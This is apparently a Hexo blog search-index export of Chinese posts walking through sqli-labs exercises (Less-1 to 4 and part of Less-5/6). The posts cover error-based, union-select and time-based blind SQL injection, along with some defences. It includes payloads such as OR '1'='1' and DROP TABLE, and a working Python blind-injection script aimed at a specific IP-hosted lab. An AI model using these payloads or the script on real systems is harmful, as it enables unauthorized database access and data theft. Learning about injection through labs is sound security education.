赋值有效过滤掉敏感数值；其次，执行计划的重用性固定了SQL语句的语义，杜绝了重新执行 SQL语句 的语法解析带来的隐患；此外，可以提高查询性能，对于操作数据量较大的Web应用程序显得尤为重要．同 时，参数化查询对数据库平台的支持性非常好，Access、SQL Server、MySQL、Oracle等常用数据库都支 持参数化查询．如果对Web程序和数据库系统安全性能要求较高，参数化查询将是很好的选择．<br>2），存储过程的优势则体现在以下几点：1)减少网络通信量．如果一个存储过程包含了几百条SQL指令， 那么这个存储过程的执行效率要比单独执行上百次的SQL指令高得多；2)执行速度更快．存储过程在创建 的同时就由数据库系统对其进行了优化和解析，而且同样的存储过程多次执行，可以从内存中直接调用， 而不需要重新创建．3)可维护I生高．程序开发人员可在不改动存储过程接口的基础上对数据库进行再开发， 而这些开发不会对Web程序造成影响．但是，存储过程也存在一定的局限，如果存储过程中执行的命令是 拼接字符串，则会存在被注入攻击的隐患．此外，存储过程并不支持所有的数据库平台．<br>3），URL重写技术通过隐藏真实的URL地址而提高Web程序的安全性．其最大的特点在于可以在不改动 Web程序接I21和数据库设计的基础上，利用ISAPI筛选器在IIS Web主机上实现，降低了应用难度，这对 程序开发要求不高的环境显得更为实用．但是，利用ISAPI筛选器实现URL重写对平台有一定的局限性， 只适用于Windows系列操作系统的服务器．</p><p>防御不太懂，<a href="http://qikan.cqvip.com/Qikan/Article/ReadIndex?id=47748139&info=kFHVfbw98IkqosiKHgC9KyjvLo97yghaqL/2oBO9XFk=">大佬论文</a></p><p>5，substr()函数：</p><pre><code>substr()函数从特定位置开始的字符串返回一个给定长度的子字符串substr()函数有三个参数，用法为：substr(str,pos,len)str参数代表待截取的字符串pos参数代表从什么位置开始截取len参数表示字符串截取的长度</code></pre><p>ascii()函数：</p><pre><code> ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符</code></pre><p>**</p><h2 id="0x0e-sqlmap和脚本"><a href="#0x0e-sqlmap和脚本" class="headerlink" title="0x0e sqlmap和脚本"></a>0x0e sqlmap和脚本</h2><p>**</p><p><strong>sqlmap</strong>在盲注这方面比较快，比你一个个试快好多啊。。。人生苦短，快用sqlmap。<br>ps：后续会学习sqlmap的使用，在这里<strong>手工注入，主要是为了了解原理</strong>，了解原理后，在使用工具<strong>burp suite</strong>爆破盲注</p><p><strong>脚本</strong>同理，只有更好的了解原理，才能编写更好的脚本，放个<a href="https://blog.csdn.net/m0_46304840/article/details/104688966">大佬脚本</a>，后续学习使用</p><pre><code class="python">import requestsimport timeheaders = &#123;&quot;user-agent&quot;: &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&quot;&#125;chars = &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.&#39;database = &#39;&#39;global lengthdef get_db():    for l in range(1, 20):        lengthUrl = &#39;http://59.63.200.79:8815/Pass-13/index.php?id=1&quot; and if(length(database())&gt;&#123;0&#125;,1,sleep(3))--+&#39;        lengthUrlFormat = lengthUrl.format(l)        start_time0 = time.time()        rsp0 = requests.get(lengthUrlFormat, headers=headers)        if time.time() - start_time0 &gt; 2.5:            print(&#39;[-]database length：&#39; + str(l))            global length            length = l            break        else:            pass    for i in range(1, length + 1):        for char in chars:            charAscii = ord(char)            url = &#39;http://59.63.200.79:8815/Pass-13/index.php?id=1&quot; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,1,sleep(3))--+&#39;            urlformat = url.format(i, charAscii)            start_time = time.time()            rsp = requests.get(urlformat, headers=headers)            if time.time() - start_time &gt; 2.5:                global database                database += char                print(&#39;[+]database runing: &#39;+ database + &quot;...&quot;)                break            else:                pass    print(&#39;database:&#39; + database)if __name__==&#39;__main__&#39;:    start = time.time()    get_db()    end = time.time()    t = int(end - start)    print(&quot;The url test time: %ss&quot;%t)</code></pre><p><strong><em>了解漏洞，注入，语句原理后再使用工具</em></strong></p><p>(๑•̀ㅂ•́)و✧(๑•̀ㅂ•́)و✧(๑•̀ㅂ•́)و✧(๑•̀ㅂ•́)و✧</p><p>**</p><h2 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h2><p>**</p><p>双引号字符型注入，单引号改一下就行</p><p>也是有这几种方法，步骤不多说了，参考上文尝试。</p><p><strong>参考链接：<a href="https://blog.csdn.net/qq_41420747/article/details/81836327">https://blog.csdn.net/qq_41420747/article/details/81836327</a></strong></p><p>2020.10.17  公瑾</p><p> ╭(●｀∀′●)╯╰(●’◡’●)╮ (●’◡’●)ﾉ ヾ(<em>′▽‘</em>)ﾉ( ‘-ωก̀ )( ‘-ωก̀ )( ‘-ωก̀ )( ‘-ωก̀ )</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab(1~4详解)</title>
      <link href="2020/10/09/sqli-lab(1-4%E8%AF%A6%E8%A7%A3)/"/>
      <url>2020/10/09/sqli-lab(1-4%E8%AF%A6%E8%A7%A3)/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a><strong>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</strong></h2><pre><code> SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</code></pre><p><strong>知识点</strong>：1，判断是数字型还是字符型，单引号还是双引号<br>                    2，union select联合查询注入<br>                    3，payload原理与防御措施</p><h2 id="0X0a"><a href="#0X0a" class="headerlink" title="0X0a"></a><strong>0X0a</strong></h2><pre><code>判断注入点及类型这道题因为是sqli-lab的靶场，所以知道是get型的单引号注入，直接在url栏就可以尝试通常情况下，加个单引号，使id这个参数不能闭合，通过分析返回的报错信息，来进一步判断![在这里插入图片描述](https://img-blog.csdnimg.cn/20201007212113129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center)**单引号判断‘ 显示数据库错误信息或者页面回显不同(整形,字符串类型判断)** 可以看到，单引号没有闭合，返回了报错信息，显示的就是单引号兄弟萌也可以直接打开源码，通过一步步的比较，进一步学习</code></pre><p><img src="https://img-blog.csdnimg.cn/20201007212337363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> sql语句如上图，id这个参数周围是单引号<br> <strong>and 1=1 / and 1=2 回显页面不同(整形判断)</strong><br>    <img src="https://img-blog.csdnimg.cn/20201007213333240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201007213338366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在数据库中 1=1 和1=2  后面随便输入字符串（相当于1=1和1=2后面的查询语句），发现select 1=”1dasd”时返回1正确，1=”2dasd”时返回0错误，即select在查询时忽略后面的字符串，只让1和后面第一个数字对比，如果相等就是正确，不相等返回错误。</p><h2 id="0x0b"><a href="#0x0b" class="headerlink" title="0x0b"></a><strong>0x0b</strong></h2><pre><code>    **union select联合查询注入**            1，***判断列数***    order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数    输入order by 4 --+,页面回显错误，说明不存在第四列</code></pre><p><img src="https://img-blog.csdnimg.cn/20201009111632654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>如此实验2和3，发现3成功，故列数为3</p><p>2，**<em>判断页面回显的列数**</em></p><p><img src="https://img-blog.csdnimg.cn/20201007214147271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">回显发现2，3列会被显示</p><p>为什么这里得用-1？？为什么2，3被显示了</p><p>因为，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。将id改成-1，使union前面的语句报错，执行后面的，爆出显示位2，3</p><p><strong><em>3，查库名，得表名，爆列名，获字段</em></strong></p><p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。(具体有点多，请自查，我也不是很懂。。。)</p><p>SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p><p>TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p><p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。</p><p><img src="https://img-blog.csdnimg.cn/20201007215104868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201007215435736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201007215640830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201007215442890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>/<em>注意，查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。</em>/     （这里并没有过滤，所以没用）</p><h2 id="0x0c-payload原理与防御措施"><a href="#0x0c-payload原理与防御措施" class="headerlink" title="0x0c payload原理与防御措施"></a><strong>0x0c payload原理与防御措施</strong></h2><p><strong>1，</strong>为什么要单引号<br>            原理：加单引号是为了让后台SQL语句执行的时候报错，这样，我们就可以初步判断单引号被放在SQL语句中执行了，执行的语句因为有单引号而出错了，方便浑水摸鱼<br>            防御：1、  将单引号过滤或者替换 – 一般程序都是这样做的    2、将单引号转义 – 所谓转义就是让它成为一个普通的字符，而不具备执行功能，php常用addslashes()函数完成这一功能    3、 将服务器设置为不允许爆错或者爆404 not found</p><p><strong>2，</strong>权限绕过<br>            有俗称的万能语句：SELECT * FROM users WHERE name = ‘’ OR ‘1’=’1’;<br>            即1=1永远为真<br>            如果这些SQL查询放在权限验证的代码中，那么该代码就会爆权限绕过了。<br><strong>3，</strong>多语句执行<br>            最常用的就是union select联合查询注入<br>            UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。<br>            比如，SELECT * FROM userinfo WHERE id=1;<strong>DROP TABLE users;</strong><br>            删库跑路。。。</p><p>sql注入的防御与绕过还不是很懂，<a href="https://www.cnblogs.com/milantgh/p/4394467.html">大佬链接</a></p><h2 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a><strong>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</strong></h2><p>知识点：1，判断是数字型还是字符型，单引号还是双引号<br>2，union select联合查询注入<br>3，payload原理与防御措施</p><p>**</p><h2 id="0x0a"><a href="#0x0a" class="headerlink" title="0x0a"></a>0x0a</h2><p>**</p><p>这道题与上道题的唯一区别就是这个是整型,即这个题的id参数没有引号，只是数字，这意味着在你绕过的时候可以不需要对后面的引号过滤（如果没有其他干扰的话）</p><p><img src="https://img-blog.csdnimg.cn/20201009112633611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">这里id=1，虽然回显没报错，但不能确定</p><p><img src="https://img-blog.csdnimg.cn/20201009112709519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>单引号就报错了，有的时候也可能是双引号</p><p><img src="https://img-blog.csdnimg.cn/20201009112743715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里后面没有过滤，却成功了，说明这个应该就是整型了</p><p>通过阅读源码，也是很讷到的</p><p><img src="https://img-blog.csdnimg.cn/20201009112936707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>id这个参数只是数字，没有一些过滤，所以确定是整型</p><p>**</p><h2 id="0x0b-1"><a href="#0x0b-1" class="headerlink" title="0x0b"></a>0x0b</h2><p>**</p><p>union select联合查询注入也是一样，区别也是id后无单引号，原因就不再说了，前边有</p><p>稍微演示前几步，知道具体区别</p><p><img src="https://img-blog.csdnimg.cn/20201009113409289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201009113415152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>很清楚的知道id=1，后面没有引号</p><p><img src="https://img-blog.csdnimg.cn/20201009113459371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>通过这幅图与上一幅图比较，可以看见当整型数据无其他干扰时，注释符也可以省略，因为不需要注释掉后边的引号</p><p>后面步骤一样，不再啰嗦</p><p>**</p><h2 id="0x0c"><a href="#0x0c" class="headerlink" title="0x0c"></a>0x0c</h2><p>**</p><p>payload的原理与防御措施，还有前边省略的几步，都在我写的less-1中，有详细的说明</p><p>这里也对前边做点补充</p><p><strong>CONCAT（）函数</strong><br>CONCAT（）函数用于将多个字符串连接成一个字符串。<br>使用数据表Info作为示例，其中SELECT id,name FROM info LIMIT 1;的返回结果为<br>+—-+——–+<br>| id | name |<br>+—-+——–+<br>| 1 | BioCyc |<br>+—-+——–+<br>语法及使用特点：<br>CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。</p><p><strong>GROUP_CONCAT（）函数</strong><br>GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。 </p><p>使用语法及特点：<br>GROUP_CONCAT([DISTINCT] expr [,expr …]<br>[ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col …]]<br>[SEPARATOR str_val])<br>在 MySQL 中，你可以得到表达式结合体的连结值。通过使用 DISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 ORDER BY 子句。<br>SEPARATOR 是一个字符串值，它被用于插入到结果值中。缺省为一个逗号 (“,”)，可以通过指定 SEPARATOR “” 完全地移除这个分隔符。 </p><p>通常情况下，这两个组合来用，对于sql注入，还是挺方便的</p><p>ps：感觉自己会的都只是浅层表面的，内在也不懂，具体逻辑，原理说不太上来</p><p>还请各位大佬评论区留言指教，非常感谢<del>(≥▽≤)/</del></p><h2 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a><strong>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</strong></h2><p>知识点：1，单引号字符变形，如:(‘’)<br>              2，union select联合查询注入<br>              3，payload原理及防御</p><p>**</p><h2 id="0x0a-1"><a href="#0x0a-1" class="headerlink" title="0x0a"></a>0x0a</h2><p>**</p><p>这几个都是类似的，单引号看一下</p><p><img src="https://img-blog.csdnimg.cn/202010091240468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>通过回显，看到有括号，推测输入的内容存放到一对单引号加圆括号中了，形如select … from … where id=(‘1’) …</p><p><img src="https://img-blog.csdnimg.cn/20201009124227339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>看下源码，能更了解sql注入绕过</p><p><img src="https://img-blog.csdnimg.cn/20201009124310104.png#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="0x0b-2"><a href="#0x0b-2" class="headerlink" title="0x0b"></a>0x0b</h2><p>**</p><p>这里与前文一样，也是看下区别就行，具体payload仿照less-1</p><p><img src="https://img-blog.csdnimg.cn/20201009125140384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201009125144307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="0x0c-1"><a href="#0x0c-1" class="headerlink" title="0x0c"></a>0x0c</h2><p>**</p><p>这里与前面不一样的就是过滤id参数，（‘’）这种过滤，通过报错回显，可以进一步了解</p><p>这时如果设置成不允许服务器爆错，他不就抓虾，得盲注了，盲注具体后边题详细说</p><p>union select联合查询注入也是一样，拼接语句，多语句执行绕过</p><p>这几篇一起学习，相似地方很多</p><h2 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a><strong>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</strong></h2><p>知识点：1，双引号字符型的判断</p><p>**</p><h2 id="0x0a-2"><a href="#0x0a-2" class="headerlink" title="0x0a"></a>0x0a</h2><p>**</p><p>输入单引号，页面无任何变化，这时候就得考虑双引号了</p><p><img src="https://img-blog.csdnimg.cn/20201009130851271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入双引号，页面报错</p><p><img src="https://img-blog.csdnimg.cn/20201009130935760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>根据报错信息判断出输入的内容被放到一对双引号和圆括号中</p><p>打开源码，一探究竟</p><p><img src="https://img-blog.csdnimg.cn/20201009131014112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>第一行将输入的id值再加一对双引号</p><p>第二行将id又加了一对括号</p><p>两次没有放在一块，代码审计得认真</p><p>不过也可以理解为select … from … where id=(”1”) …，这样其实一样</p><p>验证看一下</p><p><img src="https://img-blog.csdnimg.cn/20201009131336340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="1-4总结"><a href="#1-4总结" class="headerlink" title="1-4总结"></a>1-4总结</h2><p>**</p><p>都是基于错误的GET型一次注入，区别只是字符型或整型，单引号还是双引号，有无括号变形</p><p>payload原理和防御措施也是一样，写在前边了，详情见<strong>less-1末尾</strong>与<strong>less-2末尾</strong></p><p>这几个题放一块，方便学习与理解，参照源码，互相比对</p><p>理解错误之处还望不吝赐教,感谢大佬／人◕ ‿‿ ◕人＼</p><p>2020.10.9   公瑾</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/10/06/hello-world/"/>
      <url>2020/10/06/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
